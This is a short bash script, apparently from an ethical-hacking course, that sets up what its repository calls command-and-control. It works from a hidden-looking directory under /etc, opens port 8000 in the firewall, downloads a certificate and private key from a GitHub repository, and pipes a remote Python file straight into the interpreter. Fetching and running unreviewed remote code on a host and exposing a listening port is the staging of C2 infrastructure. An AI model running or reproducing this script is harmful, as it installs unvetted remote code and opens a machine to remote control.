#!/bin/bash
cd /etc/.python-certifications/
firewall-cmd --add-port=8000/tcp
curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem -o cert.pem

curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/key.pem -o key.pem
  
curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/week4.py | python
